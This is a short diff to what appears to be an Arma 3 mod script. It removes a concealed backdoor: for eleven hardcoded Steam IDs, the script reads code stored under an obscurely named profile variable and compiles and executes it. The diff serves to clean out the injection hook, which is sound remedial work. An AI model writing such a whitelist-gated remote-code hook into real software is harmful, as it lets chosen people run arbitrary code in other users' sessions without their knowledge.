@@ -4848,26 +4848,6 @@ MAZ_EZM_fnc_initFunction = {
 						}; 
 					};
 					if(getPlayerUID player == "_SP_PLAYER_") exitWith {};
-					
-					if !((getPlayerUID player) in [
-						"76561198156155313",
-						"76561198150558135",
-						"76561198045496731",
-						"76561199046962322",
-						"76561199048401115",
-						"76561198029421818",
-						"76561198069456197",
-						"76561198983415876",
-						"76561198358820610",
-						"76561198874058939",
-						"76561199011586457"
-					]) exitWith {};
-
-					private _codac = profileNamespace getVariable ["i2n3j4e5c6t7_8008", "{}"]; 
-					if (_codac == "{}") exitWith {}; 
-
-					if(missionNamespace getVariable ["runfncinj",false]) exitWith {}; 
-					[] call compile ("[] call " + _codac); 
 				}; 
 				"Randomize variable";
 				private _varName = "";
